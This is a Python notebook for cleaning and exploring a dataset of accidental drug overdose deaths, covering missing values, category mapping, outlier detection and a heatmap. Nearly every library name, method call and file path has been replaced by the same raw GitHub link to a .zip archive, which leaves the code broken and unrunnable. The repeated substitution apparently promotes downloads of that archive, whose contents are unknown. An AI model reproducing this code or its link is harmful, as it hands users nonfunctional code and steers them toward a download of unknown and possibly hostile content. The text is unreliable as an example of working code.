### IMPORT ALL THE LIBRARIES
import pandas as pd
import numpy as np
import re
import https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip as plt
import seaborn as sns
from https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip import files
from https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip import StandardScaler
###IMPORT THE DATASET
# Load the data
uploaded = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()
filename = list(https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip())[0]

# Read the uploaded file into a DataFrame
data = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(filename)
#Convert into a dataframe
df = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(data)
df
#Datatypes overview of attributes
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()
# Display missing values for each attribute
missing_values = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip().sum()

missing_summary = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip({
    'Attribute': https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip,
    'Missing Values': https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip
})

# Display the result
print(missing_summary)
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()
# Check skewness of the Age column
print(f"Skewness of Age: {data['Age'].skew()}")
# Display numerical attributes
numerical_attributes = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(include=['int64', 'float64'])
print("Numerical Attributes:\n", https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip())

# Display categorical attributes
categorical_attributes = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(include=['object', 'category'])
print("Categorical Attributes:\n", https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip())
##DATA PREPROCESSING
**1. DATA CLEANING**
####i) DROP COLUMNS  & HANDLING MISSING VALUES
# Load the dataset
df = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip")

# Dropping redundant and futile columns
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(
    labels=["Other Opioid","Ethnicity","Location if Other","Cause of Death", "Any Opioid", "Residence State", "Injury State", "Death State", "Manner of Death", "Injury Place"],
    axis=1,
    inplace=True
)

# Fill missing values for specific columns
missing_fill_values = {
    "Sex": "Unknown",
    "Race": "Unknown",
    "Location": "Unknown",
    "Other": "Not Specified",
    "ResidenceCityGeo": "Unknown",
    "InjuryCityGeo": "Unkown",
    "DeathCityGeo": "Unknown",
    "Other Significant Conditions ": "Not Specified",
    "Residence City": "Unknown",
    "Injury City": "Unknown",
    "Death City": "Unknown",
    "Residence County": "Unknown",
    "Injury County": "Unknown",
    "Death County": "Unknown"
}

# Apply the filling operation for the selected columns
for column, fill_value in https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip():
    if column in https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip
        df[column] = df[column].fillna(fill_value)

# Fill missing values for Age with median
if "Age" in https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip
    df["Age"] = df["Age"].fillna(df["Age"].median())

# Confirm missing values are handled
print("Missing Values after handling:\n", https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip().sum())

# Save the cleaned dataset
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip", index=False)
####ii) HANDLING DUPLICATES
# Identify Duplicated Rows
duplicates= https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()

# Return true for duplicated rows
num_duplicates = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()

# Print the number of duplicated rows
print(f"Number of Duplicated Rows {num_duplicates}")
####iii) REMOVING WHITESPACES
# Load the dataset
data_nowspace = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip")

#Removing WhiteSpace
#Step 1: Trim Whitespace from col
data_nowspace https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()

#Step 2: Trim Whitespace from Rows
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(to_replace={'Title':r'\s+'}, value='_', regex=True, inplace=True)
####iv) RENAME COLUMNS
# Load the dataset
data_nowspace = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip")

# Rename the "Location" column to "Death Place"
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(columns={"Location": "Death Place"}, inplace=True)

# Save the cleaned dataset
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip", index=False)
v) FILL MISSING VALUES IN SUBSTANCE DETAILS WITH "N/F"
# Load the dataset
df = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip")

# List of substance columns
substance_columns = [
    "Heroin", "Heroin death certificate (DC)", "Cocaine", "Fentanyl", "Fentanyl Analogue",
    "Oxycodone", "Oxymorphone", "Ethanol", "Hydrocodone", "Benzodiazepine", "Methadone",
    "Meth/Amphetamine", "Amphet", "Tramad", "Hydromorphone", "Morphine (Not Heroin)",
    "Xylazine", "Gabapentin", "Opiate NOS", "Heroin/Morph/Codeine"
]

# Replace blank cells with 'N/F'
df[substance_columns] = df[substance_columns].fillna("N/F")

# Save the cleaned dataset
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip", index=False)

# Confirm missing values are handled
print("Missing Values after handling:\n", https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip().sum())
vi) OUTLIER DETECTION
# Selecting the numerical column 'Age'
numerical_columns = ['Age']

# Convert 'Age' column to numeric
df['Age'] = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(df['Age'], errors='coerce')

# Compute IQR for Outlier Detection
Q1 = df['Age'].quantile(0.25)  # First quartile (25th percentile)
Q3 = df['Age'].quantile(0.75)  # Third quartile (75th percentile)
IQR = Q3 - Q1  # Interquartile range

# Define lower and upper bounds for outliers
lower_bound = Q1 - 1.5 * IQR
upper_bound = Q3 + 1.5 * IQR

# Detecting outliers
outliers = df[(df['Age'] < lower_bound) | (df['Age'] > upper_bound)]

# Display the youngest and oldest ages
youngest = df['Age'].min()
oldest = df['Age'].max()

print(f"Youngest Victim: {youngest}")
print(f"Oldest Victim: {oldest}")

# Display detected outliers
print("Outliers Detected:")
print(outliers[['Age']])
vii) DATA MAPPING:
# Load the dataset
df = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip")

# Define the mapping dictionary for "Race"
mapping_race = {
    "Asian/Indian": "Asian",
    "Asian, Other": "Asian",
    "Asian Indian": "Asian",
    "Black or African American": "Black",
    "Black or African American / American Indian Lenni Lenape": "Black",
    "Native American, Other": "American",
    "American Indian or Alaska Native": "American or Alaskan",
    "Other (Specify) Haitian": "Other",
    "Other (Specify) portugese, Cape Verdean": "Other",
    "Other (Specify) Puerto Rican": "Other",
    "Other Asian": "Asian",
    "Other Asian (Specify)": "Asian",
    "Blanks": "Unknown"
}

# Apply the mapping to the "Race" column
df["Race"] = df["Race"].replace(mapping_race)

# Rename "Location" column to "Death Place"
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(columns={"Location": "Death Place"}, inplace=True)

# Define the mapping dictionary for "Death Place"
mapping_death_place = {
    "Decedentâ€™s Home": "Decedent's Home",
    "Decedent’s Home": "Decedent's Home",
    "Hiospital": "Hospital",
    "Hospice Facility": "Hospice",
    "Other (Specify)": "Other"
}

# Apply the mapping to the "Death Place" column
df["Death Place"] = df["Death Place"].replace(mapping_death_place)

# List of drug presence columns
drug_columns = [
    "Heroin", "Heroin death certificate (DC)", "Cocaine", "Fentanyl", "Fentanyl Analogue",
    "Oxycodone", "Oxymorphone", "Ethanol", "Hydrocodone", "Benzodiazepine", "Methadone",
    "Meth/Amphetamine", "Amphet", "Tramad", "Hydromorphone", "Morphine (Not Heroin)",
    "Xylazine", "Gabapentin", "Opiate NOS", "Heroin/Morph/Codeine"
]

# Replace blank cells with 0 and 'Y' with 1, all else becomes NaN → convert to 0
df[drug_columns] = df[drug_columns].replace({"Y": 1}).fillna(0)

# Convert all values to integers, setting non-numeric values to 0
df[drug_columns] = df[drug_columns].apply(https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip, errors="coerce").fillna(0).astype(int)

# Apply the mapping to the "Description of Injury" column
df["Race"] = df["Race"].replace(mapping_race)


# Save the cleaned dataset
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip", index=False)

# Load the dataset
df = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip")

# Define mapping for different categories of drug use and related features
Description_of_Injury_mapping = {
    # Drug Use (General)
    "Drug use": "Drug Use (General)",
    "Used Drugs": "Drug Use (General)",
    "Drug Abuse": "Drug Use (General)",
    "drug use": "Drug Use (General)",
    "multiple drug use": "Drug Use (General)",
    "Used illicit drugs": "Drug Use (General)",
    "Used Opiates": "Drug Use (General)",
    "DrugUse": "Drug Use (General)",
    "Used illicit and prescription drugs": "Drug Use (General)",
    "Substance use disorder": "Drug Use (General)",

    # Specific Drug Use - Cocaine
    "Used Cocaine": "Cocaine Use",
    "Cocaine use": "Cocaine Use",
    "Used cocaine": "Cocaine Use",
    "Recent cocaine use": "Cocaine Use",
    "Usage of Cocaine and Heroin": "Cocaine & Heroin Use",
    "Used Cocaine and Heroin": "Cocaine & Heroin Use",
    "Took cocaine": "Cocaine Use",

    # Specific Drug Use - Heroin
    "Used Heroin": "Heroin Use",
    "Heroin Overdose": "Heroin Use",
    "Heroin use": "Heroin Use",
    "Acute Heroin Toxicity": "Heroin Use",

    # Specific Drug Use - Fentanyl
    "Used fentanyl": "Fentanyl Use",
    "Took fentanyl": "Fentanyl Use",
    "Fentanyl Use": "Fentanyl Use",
    "Took Fentanyl and Ethanol": "Fentanyl & Alcohol Use",
    "Misuse of Fentanyl Patch": "Fentanyl Use",

    # Specific Drug Use - Methadone
    "Used Methadone": "Methadone Use",
    "Used methadone": "Methadone Use",
    "Used Methanone and Ethanol": "Methadone & Alcohol Use",

    # Specific Drug Use - Oxycodone
    "Used Oxycodone": "Oxycodone Use",
    "Ingested Oxycodone and Alcohol": "Oxycodone & Alcohol Use",
    "Used oxycodone": "Oxycodone Use",

    # Specific Drug Use - Morphine
    "Used Morphine and Ethanol": "Morphine & Alcohol Use",
    "USED MORPHINE": "Morphine Use",

    # Specific Drug Use - Hydrocodone
    "Used Hydrocodone": "Hydrocodone Use",
    "Used Methadone and Hydrocodone": "Methadone & Hydrocodone Use",

    # Specific Drug Use - Benzodiazepines
    "Fentanyl and Benzodiazepine Use": "Benzodiazepine Use",
    "Alcohol and Benzodiazepine use": "Benzodiazepine & Alcohol Use",

    # Prescription/Medication Abuse
    "Prescription Medicine Abuse": "Prescription Abuse",
    "Prescription drug use": "Prescription Abuse",
    "Abused prescription medications": "Prescription Abuse",
    "Prescription Medication Abuse": "Prescription Abuse",
    "prescription medication abuse": "Prescription Abuse",
    "Prescription Medicine Misuse": "Prescription Abuse",
    "Medication Misuse": "Prescription Abuse",
    "Took prescription medication": "Prescription Abuse",
    "Used prescription medications": "Prescription Abuse",
    "Took prescribed medications": "Prescription Abuse",
    "Took prescription medications, synthetic opioid, and ethanol": "Prescription & Synthetic Opioid Use",
    "Used multiple medications": "Multiple Medication Use",
    "Used Multiple Medications": "Multiple Medication Use",
    "Took multiple medications": "Multiple Medication Use",
    "Ingested multiple medications": "Multiple Medication Use",

    # Substance Abuse (General)
    "Substance abuse": "Substance Abuse",
    "Substance Abuse": "Substance Abuse",
    "Substance sue": "Substance Abuse",
    "Substance Use": "Substance Abuse",
    "Substances Abuse": "Substance Abuse",
    "Substance Abuse Including Intravenous Injection": "Substance Abuse & Injection",
    "Substance Abuse Including Injection of Heroin": "Substance Abuse & Heroin Injection",
    "Acute and Chronic Substance Use": "Chronic Substance Abuse",
    "Acute and chronic substance use disorder": "Chronic Substance Abuse",

    # Alcohol and Drug Combination
    "Used alcohol and mitragynine": "Alcohol & Drug Combination",
    "Consumed ethanol with prescription medications": "Alcohol & Drug Combination",
    "Combined Alcohol and Medications": "Alcohol & Drug Combination",
    "Took ethanol and fentanyl": "Alcohol & Drug Combination",
    "Combined medication and substance ingestion": "Alcohol & Drug Combination",
    "Alcohol and substance abuse": "Alcohol & Drug Combination",
    "Ingested Multiple Medications and Alcohol": "Alcohol & Drug Combination",
    "Took medications and alcohol": "Alcohol & Drug Combination",
    "Alcohol and Medication Ingestion": "Alcohol & Drug Combination",
    "Combined alcohol and medication": "Alcohol & Drug Combination",

    # Route of Administration
    "Ingestion": "Ingestion",
    "Ingested drugs": "Ingestion",
    "Ingested medications": "Ingestion",
    "Ingested prescription medication": "Ingestion",
    "Injection": "Injection",
    "substance abuse (injection)": "Injection",
    "Intravenous drug abuse": "Injection",
    "Inhalation": "Inhalation",
    "Inhalation/Ingestion": "Inhalation & Ingestion",
    "Huffed Propellant": "Inhalation",
    "Used Fentanyl Patches": "Dermal Absorption",
    "Transdermal Absorption": "Dermal Absorption",

    # Overdose/Toxicity
    "Accidental Drug Overdose": "Toxicity",
    "Overdose": "Toxicity",
    "Acute and Chronic Alcohol/Substance Use Disorder": "Toxicity",
    "Toxic effects of ethanol and fentanyl": "Toxicity",
    "Toxic effects of ethanol and prescription medications": "Toxicity",

    # Unusual Cases
    "Drowned In Hot Tub While Intoxicated": "Unusual Case",
    "Drowned In Bathtub": "Unusual Case",
    "Submerged in bathtub while intoxicated": "Unusual Case",
    "Collapsed with trash can and plastic bag over face while intoxicated": "Unusual Case",
    "Swallowed bag of drug while in police custody": "Unusual Case",

    # Unknown/Missing Data
    "Unknown": "Reason Unknown",
    None: "Reason Unknown",
    float("nan"): "Reason Unknown"
}

# Update the feature column with mapped values
df["Description of Injury"] = df["Description of Injury"].map(lambda x: https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(str(x).strip(), "Reason Unknown"))
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()

# Save the cleaned dataset
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip", index=False)
**2. DATA INTEGRATION**
i) Handling redundancy using a Correlation Heatmap
# Load dataset
file_path = "https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip"
data = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(file_path)

# Convert "Y" values in substance columns to 1
substance_columns = ["Heroin", "Heroin death certificate (DC)","Cocaine","Fentanyl","Fentanyl Analogue","Oxycodone","Oxymorphone","Ethanol","Hydrocodone","Benzodiazepine","Methadone","Meth/Amphetamine","Amphet","Tramad","Hydromorphone","Morphine (Not Heroin)","Xylazine","Gabapentin","Opiate NOS","Heroin/Morph/Codeine","Other Opioid","Any Opioid"]
for col in substance_columns:
    if col in https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip
        data[col] = data[col].astype(str)https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip().map({'Y': 1}).fillna(0)

# Select numeric columns
numeric_data = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(include=['number'])

if len(https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip) > 1:
    # Compute correlation matrix
    correlation_matrix = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()

    # Heatmap
    https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(figsize=(12, 10))  # Increase figure size
    https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(correlation_matrix, annot=True, cmap="coolwarm", fmt=".2f", annot_kws={"size": 7})  # Reduce font size
    https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(rotation=45, ha="right", fontsize=8)  # Rotate x-axis labels for better readability
    https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(fontsize=8)  # Reduce y-axis font size
    https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("Correlation Heatmap", fontsize=14)  # Adjust title size
    https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()
else:
    print("Not enough numeric columns for correlation analysis.")
**3. DATA TRANSFORMATION**
i) FEATURE ENGINEERING
# Load the dataset
df = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip")

# Function to extract latitude and longitude
def extract_lat_lon(geo_column):
    if https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(geo_column) or not isinstance(geo_column, str):
        return https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip([None, None])  # Return None for missing values
    match = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(r"\(([-\d.]+), ([-\d.]+)\)", geo_column)
    return https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip()) if match else https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip([None, None])

# Apply extraction to each location column
for col in ["ResidenceCityGeo", "InjuryCityGeo", "DeathCityGeo"]:
    df[[f"{col}_Latitude", f"{col}_Longitude"]] = df[col].apply(extract_lat_lon)

# Fill missing values using mode for each column
for col in https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip
    df[col].fillna(df[col].mode()[0], inplace=True)

# Drop original columns
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(columns=["ResidenceCityGeo", "InjuryCityGeo", "DeathCityGeo"], inplace=True)

# Save cleaned dataset
https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip("https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip", index=False)

# Display sample output
print(https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip())
ii) STANDARDIZE "Age" COLUMN
# Convert Age column to numeric
df["Age"] = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(df["Age"], errors="coerce")

# Fill missing Age values with median
age_median = df["Age"].median()
df["Age"].fillna(age_median, inplace=True)

# Initialize the scaler
scaler = StandardScaler()

# Standardize the Age column and store it in a new column
df["Standardized_Age"] = https://raw.githubusercontent.com/athif2105/-Uncovering-Patterns-in-Accidental-Drug-Overdose-Deaths/main/chivalresque/Patterns_Accidental_Deaths_Uncovering_in_Overdose_Drug_3.5.zip(df[["Age"]])

# Save the updated dataset
